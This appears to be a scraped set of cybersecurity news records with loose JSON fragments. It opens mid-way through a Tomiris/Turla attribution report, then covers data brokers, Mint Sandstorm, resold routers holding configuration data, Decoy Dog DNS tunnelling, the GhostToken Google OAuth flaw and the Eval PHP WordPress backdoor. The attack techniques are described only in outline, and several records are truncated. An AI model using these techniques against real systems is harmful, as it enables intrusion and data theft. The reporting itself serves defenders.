re-evaluated.Not only Topinambour, Tunnus, TunnusSched (QUIETCANARY) and RocketMan may have been used by Tomiris in the past (we know this is the case for TunnusSched, and very likely for Tunnus due to the discovery of government victims in Russia in 2019), it could also be the case that these tools are Tomiris’s exclusive property. Looking back, we cannot help but notice that all of these tools were predominantly used in the CIS region, which is consistent with Tomiris’s traditional victimology.With this report, we hope to alert the community to the dangers of using KopiLuwak and TunnusSched to link cyberattacks to Turla. To the best of our knowledge, this toolset is currently shared between Tomiris and Turla and we cannot rule out that more actors outside our purview have access to it. We expect the attribution of this cluster of activities to remain unclear for the near future.In the grander scheme of things, this investigation reveals the pitfalls that the information security industry faces when working on cyberattacks. We rely on a knowledge pool generously shared among all participants, yet information decays: what is true today may turn out to be wrong tomorrow. Discovering new, reliable data isn’t enough; existing assumptions also need to be substantiated – which can only happen when vendors publish data. In that spirit, we kindly thank Mandiant for the research they published.Finally, this investigation illustrates the limits of technical attribution. Looking at infections and malware samples only gets us so far and we are often reminded that APT groups are subject to organizational and political constraints. On rare occasions, we stumble upon a piece of the puzzle that allows us to pierce the veil.As for the Tomiris mystery, we’ll be eagerly awaiting the next piece. AuthorsTomiris called, they want their Turla malware backYour email address will not be published.

      "title": "Feds blast ‘shadow’ operations of data brokers, revive calls for federal privacy law | SC Media",
      "text": "  The sun rises with view of Lincoln Memorial, the Washington Monument and the U.S. Capitol in Washington on April 9, 2023. (Photo by Celal Gunes/Anadolu Agency via Getty Images)The House Oversight and Investigations Subcommittee hearing on Wednesday saw lawmakers’ obvious disdain over what’s considered outright violations of consumer rights, particularly data privacy.“Data brokers are harvesting people’s data, selling or sharing it without their knowledge, and failing to keep it secure,” she added. “It certainly raises questions of how data brokers aren’t just violating people’s privacy but their civil liberties as well. ….This isn’t acceptable. Data brokers’ days of surveilling in the dark should be over.” Prior to the pandemic, the need for a federal privacy law to replace or supersede the patchwork of state regulations was a prime focus for lawmakers, which saw multiple hearings between 2018 and 2019 focused on consent and opt out policies, at a minimum.Those conversations dwindled during the COVID-19 era, but have since been revived due to the spate of reports detailing egregious privacy practices — a result of the current state regulatory gaps. What’s remained clear is the need for bipartisan agreement, and with growing pressure, it appears a federal data privacy law may be the one issue for which both parties can agree.As Rep. Frank Joseph Pallone Jr., D-N.J., sees it, these data broker practices constitute “abuses” and “an infringement of Americans’ privacy.” And due to the brokerage firms' shady operations, most consumers have no idea their data is in the hands of these firms, or how much.But while there’s certainly a need for a comprehensive privacy law, it’s imperative that Congress does not wait to resolve the details being debated by both parties to act on this poorly regulated industry.For Sherman, Congress needs to “strictly control the sale of data to foreign companies” and ban the sale completely for certain categories, such as health, location data, and information tied to children.Data brokers must also be stopped from “circumventing controls” that allow for inferred data, or composite information, many of which is public, to create profiles of consumers. This information includes location histories, political beliefs, demographic details, online habits, and other highly sensitive information that the vast majority of consumers would never share with companies.The firms are known for aggregating data tied to Americans public records, then posting the information online for search and sale. Brokers can “track and sell your race, religion, gender, sexual orientation, income level, how you vote, what you buy, what videos you watch, what prescriptions you take, and where your kids and grandkids go to school,” said Sherman.“This harms every American, especially the most vulnerable,” he added.This is not just hyperbole: inferred data has already been used to target veterans. Sherman’s team has found “individually identified data on military service members from data brokers with almost no vetting” and being sold for as little as 12.5 cents per service member.Some tech companies, including browsers like Mozilla, have banded together to shore up data privacy gaps. But Marshall Irwin, Mozilla’s vice president and chief security officer, noted that these efforts “account for roughly half of the browser and mobile operating market.”In addition to a federal privacy law and the needed controls for data brokers, lawmakers are also proposing a “one stop shop” that will allow consumers to request their data scraped by brokers to be deleted. Sherman added there must also be a way to prevent companies from profiting from public records.As it stands, these lawmakers are banking on the proposed American Data Privacy and Protection Act to begin the creation of a comprehensive privacy law. McMorris Rodgers stressed that Congress is at an “inflection point” on responsible data collection and privacy.“We will continue to build on our work from ADPPA this Congress and get these strong protections for kids and all Americans signed into law,” she added.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.TechCrunch reports that more than a million Maine residents were confirmed by state government officials to have had their personal data compromised as part of the widespread MOVEit file transfer system hack conducted by the Cl0p ransomware operation.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.TechCrunch reports that two-factor authentication has been required by major U.S. genetic testing and genealogy firms 23andMe, Ancestry, and MyHeritage in the aftermath of the significant 23andMe breach, which resulted in the theft of data from more than a million of its Jewish Ashkenazi and Chinese users.On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": "  DHS wants to get a better handle on threats to the homeland from artificial intelligence and the Chinese government. (Photo by Celal Gunes/Anadolu Agency via Getty Images)The Department of Homeland Security announced a pair of initiatives that will directly feed into the United States’ strategies for defending critical infrastructure and essential services from cyber attacks, physical attacks, artificial intelligence and other threats.He framed both as efforts to position the department long-term to effectively manage the threat landscape of the future and avoid falling prey to “failures of imagination” around emerging threats like the kind that preceded the 9/11 attacks that spurred the creation of DHS.“It is an especially challenging imperative to fulfill at a time not only of rapid change, but also of acute political divisiveness; when issues of homeland security that traditionally were unifying no longer are so, and when our adversaries continue to exploit innovations designed to bring us closer together, like social media, to push us apart,” Mayorkas said, according to prepared remarks. The department also has an interest in using AI for a range of security missions, and the task force will focus on how to “responsibly” use and manage any tools integrated into departmental operations. Among the long-term goals will be to “assess the impact of AI on our ability to secure critical infrastructure” from cyber and physical threats, deploy improved digital forensic capabilities to identify and disrupt child sexual exploitation and abuse, detect and interdict illegal fentanyl shipments, screen cargo coming into the United States at ports of entry and identify incoming goods produced with forced labor.“I recently asked our Homeland Security Advisory Council to study the intersection of AI and homeland security and deliver findings that will help guide our use of it and defense against it,” Mayorkas remarks continue. “The rapid pace of technological change – the pivotal moment we are now in – requires that we also act today.”According to Mayorkas, the “first critical area” of the upcoming departmental sprint will include an assessment on how to better defend U.S. critical infrastructure from cyber and physical threats coming from Beijing or sponsored groups that are “designed to disrupt or degrade provision of national critical functions, sow discord and panic, and prevent mobilization of U.S. military capabilities.”The sprint on China-related threats will also focus on five other areas, including disrupting the global illicit fentanyl trade, increasing screenings and vetting procedures to better spot Chinese spies or agents legally entering the country through normal immigration channels, mitigating Chinese ownership and influence over critical components of the U.S. supply chain, cracking down on illegal or unregulated fishing in the Arctic and Indo Pacific and promoting increased information sharing in law enforcement around counterintelligence threats.“Their campaign is as broad as it is unprecedented. The PRC is looking to advance its capabilities by acquiring our intellectual property; taking advantage of our openness to immigration; sponsoring a relentless barrage of cyberattacks that threaten our competitiveness and our critical infrastructure; and continuing to be a source of malign influence, disseminating mis-, dis-, and mal-information into our civic discourse,” the document states.Derek is a senior editor and reporter at SC Media, where he has spent the past three years providing award-winning coverage of cybersecurity news across the public and private sectors.

      "text": "  Advanced persistent threat (APT) group dubbed Mint Sandstorm has mastered the ability to pounce on proof-of-concept (PoC) vulnerabilities, before organizations can apply patches, and strike.The subgroup moved from reconnaissance to directly targeting critical infrastructure in the United States, including seaports, energy companies, transit systems and “a major U.S. utility and gas entity potentially in support of retaliatory destructive cyberattacks,” researchers said. Attacks began late 2021 and continued through mid-2022 and have steadily increased in pace and scope since then. The Microsoft researchers noted that while the group rapidly incorporates new PoCs into their playbooks, Mint Sandstorm continues to exploit older vulnerabilities, such as Log4Shell, on unpatched devices.Phil Neray, vice president of cyber defense strategy at CardinalOps, noted that the Cybersecurity and Infrastructure Security Agency said adversaries often develop exploits within 48 hours of a vendor update being released, knowing that it can take an average of 60 days to test and deploy patches at large organizations.Cybersecurity professionals said they weren’t surprised at learning how quickly the Iranian nation-state actors were exploiting PoCs.“[Microsoft's] recommendations are also solid,” said Mike Parkin, a senior technical engineer with Vulcan Cyber. “But ‘patch and harden’ are what cybersecurity professionals have always recommended. We just wish people would listen and do it.”The new naming convention attribute a “family name” for nation-states that incorporates a weather event — the Sandstorm designation is for believed Iranian threat groups, for example, and suspected Russian threat groups will be described with “Blizzard” family names. Suspected North Korean groups will be designated as “Sleet” and APTs with believed ties to China will be labeled “Typhoon.\"Stephen Weigand is managing editor and production manager for SC Media.

      "title": "Hackers can breach networks using data on resold corporate routers",
      "text": " Enterprise-level network equipment on the secondary market hide sensitive data that hackers could use to breach corporate environments or to obtain customer information.Looking at several used corporate-grade routers, researchers found that most of them had been improperly wiped during the decommissioning process and then sold online.Researchers at cybersecurity company ESET purchased 18 used core routers and found that the full configuration data could still be accessed on more than half of those that worked properly.Core routers are the backbone of a large network as they connect all other network devices. They support multiple data communication interfaces and are designed to forward IP packets at the highest speeds.Initially, the ESET research team bought a few used routers to set up a test environment and found they had not been properly wiped and contained network configuration data as well as information that helped identify the previous owners.The purchased equipment included four devices from Cisco (ASA 5500), three from Fortinet (Fortigate series), and 11 from Juniper Networks (SRX Series Services Gateway).Of the remaining 16 devices, only five were properly wiped and just two had been hardened, making some of the data more difficult to access.For most of them, though, it was possible to access the complete configuration data, which is a trove of details about the owner, how they set up the network, and the connections between other systems.With corporate network devices, the administrator needs to run a few commands to securely wipe the configuration and reset it. Without this, the routers can be booted into a recovery mode that allows checking how it was set up.The researchers say that some of the routers retained customer information, data that allowed third-party connections to the network, and even “credentials for connecting to other networks as a trusted party.”Additionally, eight of the nine routers that exposed the full configuration data also contained router-to-router authentication keys and hashes.The list of corporate secrets extended to complete maps of sensitive applications hosted locally or in the cloud. Some examples include Microsoft Exchange, Salesforce, SharePoint, Spiceworks, VMware Horizon, and SQL.“Due to the granularity of the applications and the specific versions used in some cases, known exploits could be deployed across the network topology that an attacker would already have mapped” - ESETSuch extensive insider details are typically reserved for “highly credentialed personnel” such as network administrators and their managers, the researchers explain.An adversary with access to this type of information could easily come up with a plan for an attack path that would take them deep inside the network undetected.“With this level of detail, impersonating network or internal hosts would be far simpler for an attacker, especially since the devices often contain VPN credentials or other easily cracked authentication tokens” - ESETBased on the details uncovered in the routers, several of them had been in environments of managed IT providers, who operate the networks of large companies.One device even belonged to a managed security services provider (MSSP) that handled networks for hundreds of clients in various sectors (e.g. education, finance, healthcare, manufacturing).Following their findings, the researchers highlight the importance of properly wiping network devices before getting rid of them. Companies should have procedures in place for the secure destruction and disposal of their digital equipment.The researchers also warn that using a third–party service for this activity may not always be a good idea. After notifying the owner of a router of their findings, they learned that the company had used such a service. “That clearly didn’t go as planned.”The advice here is to follow the recommendations from the device maker to clean the equipment of potentially sensitive data and bring it to a factory default state."

      "text": " Google’s Threat Analysis Group (TAG) has been monitoring and disrupting Russian state-backed cyberattacks targeting Ukraine’s critical infrastructure in 2023.Google reports that from January to March 2023, Ukraine received roughly 60% of the phishing attacks originating from Russia, making it the most prominent target.In most cases, the campaign goals include intelligence collection, operational disruptions, and leaking sensitive data through Telegram channels dedicated to causing information damage to Ukraine.Google’s TAG lists three Russian and Belarusian threat actors who had notable activity in the first quarter of the year against Ukrainian targets.The first is Sandworm, tracked by Google as “FrozenBarents,” which has focused its attacks on the energy sector across Europe since November 2022, with a highlighted case involving the Caspian Pipeline Consortium (CPC).Sandworm has lately launched multiple phishing campaigns using spoofed “Ukroboronprom” websites against workers in the Ukrainian defense industry, users of the Ukr.net platform, or even Ukrainian Telegram channels.The threat group also creates multiple online personas to disseminate false information on YouTube and Telegram, often leaking parts of the data they steal through phishing or network intrusions.Another highly-active Russian threat actor is APT28, tracked by Google as “FrozenLake.”Between February and March 2023, APT28 sent out multiple large waves of phishing emails targeting Ukrainians. The hackers also used reflected cross-site scripting (XSS) on Ukrainian government websites to redirect visitors to phishing pages.The third threat actor highlighted in Google’s report is “Pushcha,” which is believed to be based in Belarus, a country that is politically aligned with the Kremlin.Pushcha has recently launched campaigns that target Ukrainian webmail providers like “i.ua” and “meta.ua,” attempting to steal the users’ credentials by setting up phony sites.Google’s report also highlights cases of misinformation on its platforms, like YouTube and Blogger.The IRA (Glavset) is a Russian company linked to Wagner Group’s owner, Y. Prigozhin, engaging in online propaganda and influence operations on behalf of Russian political interests.Google reports that it has been observing and blocking IRA-linked accounts creating content on YouTube Shorts to promote specific “news-like” narratives about the war in Ukraine to Russian domestic audiences.All websites linked to the mentioned campaigns have been added to Google’s “Safe Browsing” blocklist, while targeted Gmail and Workspace users received alerts notifying them about malicious communications."

      "text": " A new enterprise-targeting malware toolkit called ‘Decoy Dog’ has been discovered after inspecting anomalous DNS traffic that is distinctive from regular internet activity.Decoy Dog helps threat actors evade standard detection methods through strategic domain aging and DNS query dribbling, aiming to establish a good reputation with security vendors before switching to facilitating cybercrime operations.Researchers from Infoblox discovered the toolkit in early April 2023 as part of its analysis of over 70 billion DNS records daily to look for signs of abnormal or suspicious activity.Infoblox reports that Decoy Dog’s DNS fingerprint is extremely rare and unique among the 370 million active domains on the internet, making it easier to identify and track.Hence, the investigation into Decoy Dog’s infrastructure quickly led to the discovery of several C2 (command and control) domains that were linked to the same operation, with most communications from these servers originating from hosts in Russia.Further investigation revealed that the DNS tunnels on these domains had characteristics that pointed to Pupy RAT, a remote access trojan deployed by the Decoy Dog toolkit.Pupy RAT is a modular open-source post-exploitation toolkit popular among state-sponsored threat actors for being stealthy (fileless), supporting encrypted C2 communications, and helping them blend their activities with other users of the tool.Less skilled actors do not use Pupy RAT, as deploying the tool with the correct DNS server configuration for C2 communications requires knowledge and expertise.Furthermore, the analysts discovered a distinct DNS beaconing behavior on all Decoy Dog domains that are configured to follow a particular pattern of periodic but infrequent DNS request generation.Investigations of the hosting and domain registration details revealed that the Decoy Dog operation had been underway since early April 2022, so it has stayed under the radar for over a year despite the toolkit’s domains showing extreme outliers in analytics.The discovery of Decoy Dog demonstrates the power of using large-scale data analytics to detect anomalous activity in the vastness of the internet.\"Infoblox has listed Decoy Dog’s domains in its report and added them to its “Suspicious Domains” list to help defenders, security analysts, and targeted organizations protect against this sophisticated threat,\" explains the InfoBlox researchers.\"The discovery of Decoy Dog, and most importantly, the fact that several seemingly unrelated domains were using the same rare toolkit was a result of this combination of automatic and human processes.\" Because the situation is complex and we have been focused on the DNS aspects of the discovery, we expect more details to come from the industry, in addition to ourselves, in the future.\""

      "title": "'GhostToken' vulnerability could permanently expose data of Google users | SC Media",
      "text": "  A zero-day vulnerability dubbed “GhostToken” could let threat actors gain unremovable access to a victim's Google account by converting an authorized third-party app into a malicious trojan, leaving a victim's personal data exposed indefintely. On the other hand, the attacker can use a refresh token they receive when they take over the victim’s account to access the victim’s account and then hide the app again to restore its unremovable state. Since these applications are hidden from the victim’s view, the victim remains in the dark. They are prevented from even knowing their account has been hacked — and even if they do suspect it — the only step they can take is to set up a new Google account. While security researchers can consider this new from a “known attack technique” perspective, the abused feature it leverages has been there for a while, said Mike Parkin, senior technical engineer at Vulcan Cyber.Of course, depending on the permissions victims assign the malicious app, attackers can potentially read the victim’s private correspondences in Gmail, gain access to personal Google Drive and Google Photos files, view planned events on Google calendar, track the victim’s location via Google Maps, and grant access to the victim’s Google Cloud Platform services. Craig Burland, chief information security officer at Inversion6, added that the disclosure from Astrix should help cybersecurity teams bring focus to cloud security and specifically third-party integrations. Burland said the cloud ecosystem offers a wealth of integrations that can add or enhance capabilities: everything from simple mail-merge to full-blown analytics are just a few clicks away.“But there’s another side to that coin,” said Burland. “Cyber teams are already struggling to efficiently and effectively manage third-party risk as organizations lob 300-question surveys at each other in desperation. Cloud integrations bypass all of that governance and cut straight to the heart, boosting productivity and also inviting risk. So, who looks to see what’s integrated with your cloud application? Who checks what rights and permissions have been granted? What personal data has been exposed?”TechCrunch reports that more than a million Maine residents were confirmed by state government officials to have had their personal data compromised as part of the widespread MOVEit file transfer system hack conducted by the Cl0p ransomware operation.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Thu Dec 7Tue Mar 26On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "title": "Attackers use abandoned WordPress plugin to backdoor websites",
      "text": " Attackers are using Eval PHP, an outdated legitimate WordPress plugin, to compromise websites by injecting stealthy backdoors.Eval PHP is an old WordPress plugin that allows site admins to embed PHP code on pages and posts of WordPress sites and then execute the code when the page is opened in the browser.The plugin has not been updated in the past decade and is generally considered abandonware, yet it is still available through the WordPress plugins repository.The main advantage of this method versus conventional backdoor injections is that Eval PHP may be reused to reinfect cleaned sites while keeping the point of compromise relatively hidden.PHP code injections detected over the last couple of weeks deliver a previously documented payload that gives the attackers remote code execution capabilities over the compromised site.The malicious code is injected into the targeted websites' databases, specifically into the 'wp_posts' table. This makes it harder to detect as it evades standard website security measures like file integrity monitoring, server-side scans, etc.To do that, the threat actors use a compromised or newly created administrator account to install Eval PHP, allowing them to insert PHP code into pages and posts of the breached site using [evalphp] shortcodes.​Once the code runs, it drops the backdoor (3e9c0ca6bbe9.php) in the site root. The name of the backdoor may differ between different attacks.The malicious Eval PHP plugin installations are triggered from the following IP addresses:The backdoor does not use POST requests for C2 communication to evade detection but, instead, it passes data through cookies and GET requests without visible parameters.Moreover, the malicious [evalphp] shortcodes are planted in saved drafts hidden in the SQL dump of the \"wp_posts\" table and not on published posts. This is still enough to execute the code that injects the backdoor into the website's database.Sucuri highlights the need to delist old and unmaintained plugins that threat actors can easily abuse for malicious purposes and points out that Eval PHP isn't the only risky case.Until those responsible for managing the WordPress plugin repository decide to take action, website owners are recommended to take action to secure their admin panels, keep their WordPress installation up to date, and use a web application firewall."
